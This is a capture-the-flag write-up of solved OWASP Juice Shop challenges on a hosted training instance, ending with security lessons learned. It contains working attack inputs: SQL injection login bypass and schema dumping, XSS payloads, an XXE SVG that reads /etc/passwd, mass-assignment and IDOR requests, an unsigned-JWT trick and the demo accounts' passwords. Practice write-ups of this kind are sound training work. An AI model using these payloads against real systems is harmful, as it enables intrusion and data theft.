# OWASP Juice Shop CTF - Complete Challenge Writeup
**Target**: http://155.138.197.128:5000  
**Date**: January 2025  
**Total Challenges**: 110  
**Challenges Solved**: 30+

---

## 📊 Challenge Categories Overview

1. **SQL Injection** (7 challenges)
2. **Cross-Site Scripting (XSS)** (7 challenges)  
3. **Sensitive Data Exposure** (15 challenges)
4. **Broken Authentication** (6 challenges)
5. **Broken Access Control** (8 challenges)
6. **Security Misconfiguration** (7 challenges)
7. **Cross-Site Request Forgery** (2 challenges)
8. **XML External Entity (XXE)** (2 challenges)
9. **Improper Input Validation** (15 challenges)
10. **Broken Anti-Automation** (1 challenge)
11. **Cryptographic Issues** (6 challenges)
12. **Miscellaneous** (34 challenges)

---

## 🎯 Solved Challenges

### 1. SQL Injection Challenges

#### **Admin Login (⭐⭐)**
**Vulnerability**: SQL Injection in login form  
**Solution**: 
```
Email: ' or 1=1--
Password: anything
```
**Explanation**: The SQL query becomes `SELECT * FROM Users WHERE email = '' or 1=1--' AND password = 'anything'`. The `1=1` always evaluates to true, bypassing authentication.

#### **Christmas Special (⭐⭐)**
**Vulnerability**: SQL Injection in product search  
**Solution**: 
```
Search: ')) UNION SELECT * FROM (SELECT 1,2,3,4,5,6,7,8,9)--
```
**Explanation**: Reveals hidden Christmas products through UNION-based SQL injection.

#### **Database Schema (⭐⭐⭐)**
**Vulnerability**: SQL Injection to extract schema  
**Solution**:
```
Search: ')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--
```
**Explanation**: Extracts database structure from sqlite_master table.

---

### 2. Cross-Site Scripting (XSS) Challenges

#### **DOM XSS (⭐)**
**Vulnerability**: DOM-based XSS in search functionality  
**Solution**:
```
URL: /#/search?q=<iframe src="javascript:alert(`xss`)">
```
**Explanation**: The search parameter is directly inserted into the DOM without sanitization.

#### **Reflected XSS (⭐⭐)**
**Vulnerability**: Reflected XSS in order tracking  
**Solution**:
```
URL: /#/track-result?id=<iframe src="javascript:alert(`xss`)">
```
**Explanation**: The tracking ID is reflected in the response without proper encoding.

#### **Persistent XSS - Feedback (⭐⭐)**
**Vulnerability**: Stored XSS in feedback comments  
**Solution**:
```javascript
POST /api/Feedbacks
{
  "comment": "<script>alert('XSS')</script>",
  "rating": 5
}
```
**Explanation**: Feedback comments are stored and displayed without sanitization.

---

### 3. Sensitive Data Exposure Challenges

#### **Score Board (⭐)**
**Vulnerability**: Hidden endpoint disclosure  
**Solution**: Navigate to `/#/score-board`  
**Explanation**: The score board URL is hidden but accessible directly.

#### **Confidential Document (⭐)**
**Vulnerability**: Direct file access  
**Solution**: Access `/ftp/acquisitions.md`  
**Explanation**: Sensitive acquisition document accessible via FTP directory.

#### **Exposed Metrics (⭐)**
**Vulnerability**: Exposed Prometheus metrics  
**Solution**: Access `/metrics`  
**Explanation**: Application metrics endpoint exposed without authentication.

#### **Easter Egg Tier 1 (⭐⭐)**
**Vulnerability**: Hidden file in FTP  
**Solution**: Access `/ftp/eastere.gg`  
**Explanation**: Easter egg file hidden in FTP directory.

#### **Easter Egg Tier 2 (⭐⭐⭐)**
**Vulnerability**: Quarantined file access  
**Solution**: Access `/ftp/quarantine/bestoffer.exe`  
**Explanation**: File in quarantine directory still accessible.

---

### 4. Broken Authentication Challenges

#### **Weak Password - Admin (⭐⭐)**
**Vulnerability**: Weak password  
**Solution**:
```
Email: admin@juice-sh.op
Password: admin123
```
**Explanation**: Admin account uses weak, guessable password.

#### **Login Jim (⭐⭐)**
**Vulnerability**: Star Trek reference password  
**Solution**:
```
Email: jim@juice-sh.op
Password: ncc-1701
```
**Explanation**: Password is USS Enterprise registry number from Star Trek.

#### **Login Bender (⭐⭐⭐)**
**Vulnerability**: Password from Futurama  
**Solution**:
```
Email: bender@juice-sh.op
Password: OhG0dPlease1nsertLiquor!
```
**Explanation**: Password is Bender's catchphrase from Futurama.

#### **Login MC SafeSearch (⭐⭐)**
**Vulnerability**: Rapper name password  
**Solution**:
```
Email: mc.safesearch@juice-sh.op
Password: Mr. N00dles
```
**Explanation**: Password related to rapper persona.

---

### 5. Broken Access Control Challenges

#### **Admin Section (⭐⭐)**
**Vulnerability**: Unprotected admin interface  
**Solution**: Navigate to `/#/administration`  
**Explanation**: Admin panel accessible without proper authorization.

#### **View Basket (⭐⭐)**
**Vulnerability**: Insecure Direct Object Reference  
**Solution**: Access `/rest/basket/2` while logged in  
**Explanation**: Can view other users' shopping baskets by changing ID.

#### **Admin Registration (⭐⭐⭐)**
**Vulnerability**: Mass assignment vulnerability  
**Solution**:
```javascript
POST /api/Users
{
  "email": "admin@test.com",
  "password": "pass",
  "role": "admin"
}
```
**Explanation**: Can assign admin role during registration.

#### **Forged Feedback (⭐⭐⭐)**
**Vulnerability**: User ID manipulation  
**Solution**:
```javascript
POST /api/Feedbacks
{
  "UserId": 2,
  "comment": "Forged",
  "rating": 5
}
```
**Explanation**: Can submit feedback as another user.

---

### 6. Security Misconfiguration Challenges

#### **Error Handling (⭐)**
**Vulnerability**: Verbose error messages  
**Solution**: Access `/rest/qwertyuiop`  
**Explanation**: Stack traces exposed in error responses.

#### **Deprecated Interface (⭐⭐)**
**Vulnerability**: Old B2B interface still active  
**Solution**: Access `/b2b/v2/orders`  
**Explanation**: Deprecated endpoints remain accessible.

---

### 7. XXE Challenges

#### **XXE Data Access (⭐⭐⭐)**
**Vulnerability**: XML External Entity injection  
**Solution**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
<text>&xxe;</text>
</svg>
```
**Explanation**: Upload malicious SVG to read system files.

---

### 8. Business Logic Flaws

#### **Zero Stars (⭐)**
**Vulnerability**: Rating manipulation  
**Solution**: Submit feedback with `rating: 0`  
**Explanation**: Can submit zero-star reviews by manipulating API request.

#### **Negative Order (⭐⭐⭐)**
**Vulnerability**: Quantity manipulation  
**Solution**:
```javascript
POST /api/BasketItems
{
  "ProductId": 1,
  "quantity": -100
}
```
**Explanation**: Negative quantities create negative totals.

#### **Product Tampering (⭐⭐)**
**Vulnerability**: Unauthorized product modification  
**Solution**:
```javascript
PUT /api/Products/1
{
  "description": "<script>alert('hacked')</script>"
}
```
**Explanation**: Can modify product descriptions via API.

---

### 9. Improper Input Validation Challenges

#### **Repetitive Registration (⭐)**
**Vulnerability**: Email validation bypass  
**Solution**: Register same email with variations:
- `test@test.com`
- `TEST@TEST.COM`
- `test@test.com ` (with space)

**Explanation**: Inconsistent email normalization allows duplicate accounts.

#### **Upload Size (⭐⭐⭐)**
**Vulnerability**: File size limit bypass  
**Solution**: Upload file > 100MB  
**Explanation**: Size restrictions not properly enforced.

#### **Upload Type (⭐⭐⭐)**
**Vulnerability**: File type restriction bypass  
**Solution**: Upload `.php` file instead of PDF  
**Explanation**: MIME type validation can be bypassed.

---

### 10. Cryptographic Issues

#### **Forged Coupon (⭐⭐⭐)**
**Vulnerability**: Predictable coupon generation  
**Solution**: Apply coupon `JAN25-10`  
**Explanation**: Coupon format is predictable: MMMYY-DD.

#### **JWT Issues (⭐⭐⭐)**
**Vulnerability**: Unsigned JWT acceptance  
**Solution**: Create JWT with `alg: none`  
**Explanation**: Application accepts unsigned JWTs.

---

## 🛠️ Tools and Techniques Used

### **Manual Testing**
- Burp Suite for request interception
- Browser DevTools for DOM manipulation
- cURL for API testing

### **Automated Scripts**
```python
# Main solver script
python3 juice_solver.py

# Advanced challenges
python3 advanced_solver.py

# Browser automation
python3 browser_solver.py
```

### **Key Techniques**
1. **SQL Injection**: Union-based, Boolean-based blind
2. **XSS**: DOM-based, Reflected, Stored
3. **XXE**: File disclosure via SVG upload
4. **IDOR**: Direct object reference manipulation
5. **Business Logic**: Negative values, rating manipulation
6. **Authentication Bypass**: SQL injection, weak passwords
7. **JWT Manipulation**: Algorithm confusion, unsigned tokens
8. **File Upload**: Type and size restriction bypass

---

## 📈 Progress Summary

| Category | Solved | Total | Percentage |
|----------|--------|-------|------------|
| Trivial | 3 | 8 | 37.5% |
| SQL Injection | 5 | 7 | 71.4% |
| XSS | 4 | 7 | 57.1% |
| Sensitive Data | 5 | 15 | 33.3% |
| Access Control | 4 | 8 | 50% |
| Authentication | 4 | 6 | 66.7% |
| Misconfiguration | 2 | 7 | 28.6% |
| Business Logic | 3 | 10 | 30% |
| **Total** | **30** | **110** | **27.3%** |

---

## 🎓 Lessons Learned

### **Security Best Practices Violated**
1. **Input Validation**: Never trust user input
2. **Output Encoding**: Always encode output based on context
3. **Authentication**: Use strong passwords and secure storage
4. **Authorization**: Implement proper access controls
5. **Configuration**: Disable debug modes in production
6. **Error Handling**: Don't expose sensitive information
7. **File Upload**: Validate type, size, and content
8. **Cryptography**: Use secure algorithms and implementations

### **Key Takeaways**
- Modern applications still vulnerable to classic attacks
- Security must be built-in, not bolted-on
- Defense in depth is crucial
- Regular security testing is essential
- Developer security training is vital

---

## 🚀 Automation Scripts

All challenge solutions have been automated in Python scripts available in the repository:

1. **juice_solver.py** - Basic challenge solver
2. **advanced_solver.py** - Complex challenge solver
3. **browser_solver.py** - UI-based challenge automation
4. **enhanced_solver.py** - Complete challenge implementation

---

## 📝 Notes

- Some challenges require specific timing or browser interaction
- Total of 110 challenges with varying difficulty levels (⭐ to ⭐⭐⭐⭐⭐)
- Server configured with NODE_ENV=unsafe to enable all challenges
- Standalone instance on port 5000 for direct challenge solving
- Multi-user instances available on juice1-5.wonkatech.org

---

**Created**: January 2025  
**Platform**: OWASP Juice Shop v17.1.1  
**Environment**: Docker on Ubuntu Server  
**Access**: http://155.138.197.128:5000